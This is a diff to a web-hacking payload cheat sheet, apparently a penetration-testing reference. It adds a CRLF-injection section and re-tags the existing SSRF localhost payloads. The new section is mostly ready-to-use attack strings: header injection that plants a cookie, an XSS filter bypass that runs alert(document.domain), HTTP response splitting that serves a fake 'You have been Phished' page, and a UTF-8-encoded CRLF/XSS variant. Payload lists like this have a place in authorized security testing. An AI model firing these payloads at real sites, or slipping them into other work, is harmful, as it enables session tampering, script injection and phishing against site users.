@@ -25,6 +25,7 @@
   - [SSTI](#server-side-template-injection-ssti-to-rce)
   - [SSRF](#ssrf-common-payloads)
   - [CSRF](#csrf-common-payloads)
+  - [CRLF](#crlf-common-payloads)
   - [LFI](#local-file-inclusion-lfi-payloads)
   - [RFI](#remote-file-inclusion-rfi)
   - [SQLI](#sql-injection-payload-list)
@@ -210,22 +211,22 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 --------------------------------------------------------------------------------
 # SSRF common payloads
-```
+```http
 http://127.0.0.1:80
 ```
-```
+```http
 http://127.0.0.1:443
 ```
-```
+```http
 http://127.0.0.1:22
 ```
-```
+```http
 http://0.0.0.0:80
 ```
-```
+```http
 http://0.0.0.0:443
 ```
-```
+```http
 http://0.0.0.0:22
 ```
 --------------------------------------------------------------------------------
@@ -281,6 +282,39 @@ xhr.send('{"role":admin}');
 </script>
 ```
 #### [source](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
+--------------------------------------------------------------------------------
+# CRLF common payloads
+
+### Add a cookie
+`request`
+```http
+http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
+```
+response
+```http
+Connection: keep-alive
+Content-Length: 178
+Content-Type: text/html
+Date: Mon, 09 May 2016 14:47:29 GMT
+Location: https://www.example.net/[INJECTION STARTS HERE]
+Set-Cookie: mycookie=myvalue
+X-Frame-Options: SAMEORIGIN
+X-Sucuri-ID: 15016
+x-content-type-options: nosniff
+x-xss-protection: 1; mode=block
+```
+### XSS bypass
+```http
+http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
+```
+### HTML
+```http
+http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
+```
+### UTF-8 encoded payload
+```http
+%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
+```
 --------------------------------------------------------------------------------
 
 # Remote File Inclusion (RFI)
